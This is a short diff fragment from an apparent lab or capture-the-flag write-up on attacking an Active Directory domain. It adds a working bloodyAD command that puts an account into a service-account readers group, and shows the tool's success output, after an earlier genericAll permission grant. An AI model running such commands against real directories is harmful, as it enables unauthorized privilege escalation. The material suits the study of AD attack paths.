@@ -905,5 +905,13 @@ bloodyAD --host dc01.trask.hsm -d trask.hsm -k add genericAll 'CN=Sentinel Servi
 Then ill add full control 
 
 ```python
+bloodyAD --host dc01.trask.hsm -d trask.hsm -k add groupMember 'CN=SENTINEL SERVICE ACCOUNT READERS,OU=SENTINELS,DC=TRASK,DC=HSM' 'CN=SENTINEL-5TAINB,OU=SENTINELS,DC=TRASK,DC=HSM' 
+
+[+] CN=SENTINEL-5TAINB,OU=SENTINELS,DC=TRASK,DC=HSM added to CN=SENTINEL SERVICE ACCOUNT READERS,OU=SENTINELS,DC=TRASK,DC=HSM
+```
+
+Then ill add the account to the group
+
+```python
 
 ```
